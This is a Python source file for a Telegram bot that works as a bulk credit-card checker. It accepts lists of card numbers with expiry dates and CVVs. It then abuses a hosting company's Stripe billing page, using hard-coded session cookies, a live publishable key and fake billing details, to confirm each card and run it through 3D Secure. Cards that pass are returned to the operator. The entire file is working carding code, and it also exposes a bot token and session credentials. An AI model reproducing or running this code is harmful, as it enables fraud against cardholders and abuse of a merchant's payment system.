import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
import json
import base64
import re
from datetime import datetime
import os

# ========== CONFIGURATION ==========
BOT_TOKEN = "8334507568:AAEAX1kHSnU5PZXeLsDAkvOsZx6roHMHAr8"  # Replace with your bot token
ADMIN_IDS = [5895491379,6220135474]  # Replace with admin user IDs

# ========== MULTI-USER STATS ==========
user_sessions = {}  # {user_id: {stats}}

def get_user_stats(user_id):
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'dashboard_message_id': None,
            'chat_id': None,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
        }
    return user_sessions[user_id]

def reset_user_stats(user_id):
    if user_id in user_sessions:
        user_sessions[user_id].update({
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
        })

# ========== Stripe Configuration from test.py ==========
stripe_key = 'pk_live_CFEaNA7LjEZgspZDKnDxeQJZ00Ne5Of6uU'
cookies = {
    '_hjSession_3605126': 'eyJpZCI6IjE3NThiM2VkLWQyZWItNGFhMC1iM2Q0LWVmYzc0YmJiYTlmMCIsImMiOjE3NjY0OTMzMzUzODAsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxfQ==',
    'intercom-device-id-vwhwt4d6': 'ee3ebfea-8837-426a-8c76-a2cc0dc0abf6',
    '_hjSessionUser_3605126': 'eyJpZCI6ImQzNmFlMTdlLTI0MWMtNWRiOS1hYmNmLTM2MjY1NmJjZDUyOSIsImNyZWF0ZWQiOjE3NjY0OTMzMzUzNzksImV4aXN0aW5nIjp0cnVlfQ==',
    '_gid': 'GA1.2.225410859.1766493355',
    'smuuid': '19b4b3585e8-98ee22311512-22b0a454-0f4d866e-7147c2fd-9f009fe6cdf2',
    '__mmapiwsid': '019b472b-366f-7c22-88a7-338f7140681e:3687c2399655c5dcbb96f666ec7430ee3bc6f72d',
    '_smvs': 'T1RIRVI=',
    'CookieConsent': '{stamp:%274aLpd0iQeIx0rsdEXqSjYE07azsjhhScV3n+VxJ3/41eRNzqsVDJQA==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1766493359845%2Cregion:%27eg%27}',
    '__stripe_mid': '4bc94b67-42d9-4211-a7e9-58461a2b910ff0f1cb',
    'SESSID7dfc': 'is8hb6736a436bi6t9j06jsjv0',
    '_gcl_au': '1.1.201178503.1766493344.1874117477.1766493380.1766495690',
    '_ga': 'GA1.1.1306708116.1766493336',
    '_ga_WPKWS2FHC9': 'GS2.1.s1766493335$o1$g1$t1766495725$j52$l0$h1527233066',
    'smvr': 'eyJ2aXNpdHMiOjEsInZpZXdzIjo0NiwidHMiOjE3NjY0OTU3MjUzNzEsImlzTmV3U2Vzc2lvbiI6ZmFsc2V9',
}

def get_status_color(status):
    status_messages = {
        'C': ('GREEN', '3D Approved'),
        'R': ('RED', 'Declined'),
        'Y': ('YELLOW', 'Authentication Successful'),
        'A': ('YELLOW', 'Authentication Attempted'),
        'N': ('RED', 'Not Authenticated'),
        'U': ('YELLOW', 'Authentication Unavailable'),
        'I': ('YELLOW', 'Information Only'),
    }
    color, message = status_messages.get(status, ('WHITE', 'Unknown Status'))
    return f"({status}) -> {message}"

async def check_card(card, bot_app, user_id):
    stats = get_user_stats(user_id)
    
    if not stats['is_running']:
        return card, "STOPPED", "Stopped by user"
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        return card, "ERROR", "Invalid format"
    
    cc, mm, yy, cvv = parts
    card_info = f"{cc}|{mm}|{yy}|{cvv}"
    
    try:
        # Step 1: Get client_secret
        headers_page = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'dnt': '1',
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }

        response_page = requests.get('https://billing.time4vps.com/stripe_intents_3dsecure/obtain_token/', 
                                      cookies=cookies, headers=headers_page)

        match = re.search(r'stripe\.handleCardSetup\(\s*["\']([^"\']+)["\']', response_page.text)

        if not match:
            stats['errors'] += 1
            return card, "ERROR", "Could not find client_secret"
        
        client_secret = match.group(1)
        setup_intent_id = client_secret.split('_secret_')[0]

        # Step 2: Confirm payment
        headers = {
            'accept': 'application/json',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }

        data = (
            f'payment_method_data[type]=card'
            f'&payment_method_data[billing_details][address][country]=EG'
            f'&payment_method_data[billing_details][address][city]=Napoleon'
            f'&payment_method_data[billing_details][address][line1]=111+North+Street'
            f'&payment_method_data[billing_details][address][postal_code]=49261-9011'
            f'&payment_method_data[billing_details][email]=jeremyp.atte.rsonqj16%40gmail.com'
            f'&payment_method_data[billing_details][name]=Card+details+saad'
            f'&payment_method_data[card][number]={cc}'
            f'&payment_method_data[card][cvc]={cvv}'
            f'&payment_method_data[card][exp_month]={mm}'
            f'&payment_method_data[card][exp_year]={yy}'
            f'&payment_method_data[guid]=a32e4de1-e975-4f08-a0f7-e1c7597315c3fb0e66'
            f'&payment_method_data[muid]=4bc94b67-42d9-4211-a7e9-58461a2b910ff0f1cb'
            f'&payment_method_data[sid]=eef30139-60e3-49be-873c-08006f4fe8d2ab11ea'
            f'&payment_method_data[pasted_fields]=number'
            f'&payment_method_data[payment_user_agent]=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element'
            f'&payment_method_data[referrer]=https%3A%2F%2Fbilling.time4vps.com'
            f'&payment_method_data[time_on_page]=37266'
            f'&payment_method_data[client_attribution_metadata][client_session_id]=3e60c80e-d53a-46fe-9063-dbc64d139641'
            f'&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements'
            f'&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element'
            f'&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017'
            f'&expected_payment_method_type=card'
            f'&use_stripe_sdk=true'
            f'&key={stripe_key}'
            f'&client_attribution_metadata[client_session_id]=3e60c80e-d53a-46fe-9063-dbc64d139641'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
            f'&client_attribution_metadata[merchant_integration_version]=2017'
            f'&client_secret={client_secret}'
        )

        response = requests.post(
            f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm',
            headers=headers,
            data=data,
        )

        try:
            response_json = json.loads(response.text)
        except json.JSONDecodeError:
            stats['errors'] += 1
            return card, "ERROR", "Invalid JSON response"

        if 'error' in response_json:
            error_msg = response_json['error']['message']
            stats['failed'] += 1
            return card, "FAILED", error_msg

        status = response_json.get('status')
        
        if status == 'requires_action' and 'next_action' in response_json:
            next_action = response_json.get('next_action', {})
            use_stripe_sdk = next_action.get('use_stripe_sdk', {})
            
            server_transaction_id = use_stripe_sdk.get('server_transaction_id')
            three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
            
            if not server_transaction_id or not three_d_secure_2_source:
                stats['errors'] += 1
                return card, "ERROR", "Missing 3DS data"
            
            fingerprint_json = json.dumps({"threeDSServerTransID": server_transaction_id})
            fingerprint_base64 = base64.b64encode(fingerprint_json.encode()).decode()
            
            headers_3ds = {
                'accept': 'application/json',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            }
            
            data_3ds = f'source={three_d_secure_2_source}&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22{fingerprint_base64}%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-120%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F143.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key={stripe_key}'
            
            response_3ds = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_3ds, data=data_3ds)
            
            try:
                response_3ds_json = json.loads(response_3ds.text)
            except json.JSONDecodeError:
                stats['errors'] += 1
                return card, "ERROR", "Invalid 3DS JSON response"
            
            ares = response_3ds_json.get('ares', {})
            if isinstance(ares, dict):
                trans_status = ares.get('transStatus', 'N')
            else:
                trans_status = 'N'
            
            status_msg = get_status_color(trans_status)
            if trans_status in ['C', 'Y', 'A']:
                stats['success_3ds'] += 1
                stats['success_cards'].append(card)
                await send_result(bot_app, card, "SUCCESS", status_msg, user_id)
                return card, "SUCCESS", status_msg
            else:
                stats['failed'] += 1
                return card, "FAILED", status_msg
            
        else:
            stats['success_3ds'] += 1
            stats['success_cards'].append(card)
            await send_result(bot_app, card, "SUCCESS", "No 3D Secure required", user_id)
            return card, "SUCCESS", "No 3D Secure required"
            
    except Exception as e:
        stats['errors'] += 1
        return card, "EXCEPTION", str(e)

async def send_result(bot_app, card, status_type, message, user_id):
    stats = get_user_stats(user_id)
    if status_type == 'SUCCESS':
        text = (
            "╔════════════════════════╗\n"
            f"✨ **3DS VERIFICATION PASSED**\n"
            "╚════════════════════════╝\n\n"
            f"💳 `{card}`\n\n"
            f"✅ **Status:** {message}\n"
            "╚════════════════════════╝"
        )
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'],
            text=text,
            parse_mode='Markdown'
        )

def create_dashboard_keyboard(user_id):
    stats = get_user_stats(user_id)
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 Checking: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ 3DS Success: {stats['success_3ds']}", callback_data="success"),
            InlineKeyboardButton(f"❌ Failed: {stats['failed']}", callback_data="failed")
        ],
        [
            InlineKeyboardButton(f"🚫 Errors: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 Stop Checking", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app, user_id):
    stats = get_user_stats(user_id)
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **3D SECURE CHECKER - LIVE DASHBOARD** 📊",
                reply_markup=create_dashboard_keyboard(user_id),
                parse_mode='Markdown'
            )
        except:
            pass

async def send_final_files(bot_app, user_id):
    stats = get_user_stats(user_id)
    try:
        if stats['success_cards']:
            success_text = "\n".join(stats['success_cards'])
            filename = f"3ds_success_{user_id}_{int(datetime.now().timestamp())}.txt"
            with open(filename, "w", encoding='utf-8') as f:
                f.write(success_text)
            await bot_app.bot.send_document(
                chat_id=stats['chat_id'],
                document=open(filename, "rb"),
                caption=f"✅ **3DS Success Cards** ({len(stats['success_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove(filename)
        
    except Exception as e:
        print(f"[!] File sending error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized - This bot is private")
        return
    
    user_id = update.effective_user.id
    
    keyboard = [
        [InlineKeyboardButton("📁 Send Card File", callback_data="send_file")]
    ]
    
    await update.message.reply_text(
        "╔════════════════════════╗\n"
        "🚀 **3D SECURE CHECKER BOT** 🚀\n"
        "╚════════════════════════╝\n\n"
        "💼 **How to use:**\n"
        "Send a .txt file with cards\n"
        "Format: `number|month|year|cvv`\n\n"
        "✨ **Features:**\n"
        "• Multi-user support\n"
        "• Real-time dashboard\n"
        "• Comprehensive error detection\n\n"
        "👥 Multiple users can check simultaneously!",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    user_id = update.effective_user.id
    stats = get_user_stats(user_id)
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ You already have an active check! Complete or stop it first.")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    reset_user_stats(user_id)
    
    stats.update({
        'total': len(cards),
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id,
    })
    
    dashboard_msg = await update.message.reply_text(
        text="📊 **3D SECURE CHECKER - LIVE DASHBOARD** 📊",
        reply_markup=create_dashboard_keyboard(user_id),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    asyncio.create_task(process_cards(cards, context.application, user_id))

async def process_cards(cards, bot_app, user_id):
    stats = get_user_stats(user_id)
    
    batch_size = 3
    total_cards = len(cards)
    
    for i in range(0, total_cards, batch_size):
        if not stats['is_running']:
            stats['last_response'] = 'Stopped by user 🛑'
            await update_dashboard(bot_app, user_id)
            break
        
        batch = cards[i:i + batch_size]
        
        stats['checking'] = len(batch)
        
        if batch:
            parts = batch[0].split('|')
            stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else batch[0][:10]
            if len(batch) > 1:
                stats['current_card'] += f" +{len(batch)-1} more"
        
        await update_dashboard(bot_app, user_id)
        
        tasks = [asyncio.create_task(check_card(card, bot_app, user_id)) for card in batch]
        await asyncio.gather(*tasks)
        
        stats['cards_checked'] += len(batch)
        stats['checking'] = 0
        
        if stats['cards_checked'] % 10 == 0 or stats['cards_checked'] == total_cards:
            await update_dashboard(bot_app, user_id)
        
        await asyncio.sleep(0.5)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app, user_id)
    
    await send_final_files(bot_app, user_id)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ Unauthorized", show_alert=True)
        return
    
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    
    if query.data == "stop_check":
        if stats['is_running']:
            stats['is_running'] = False
            stats['checking'] = 0
            stats['last_response'] = 'Stopped 🛑'
            await update_dashboard(context.application, user_id)
            try:
                await context.application.bot.send_message(
                    chat_id=stats['chat_id'],
                    text="🛑 **Check stopped by user!**",
                    parse_mode='Markdown'
                )
            except:
                pass
    
    elif query.data == "send_file":
        await query.answer("📁 Send your card file now", show_alert=True)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    app.run_polling()

if __name__ == "__main__":
    main()
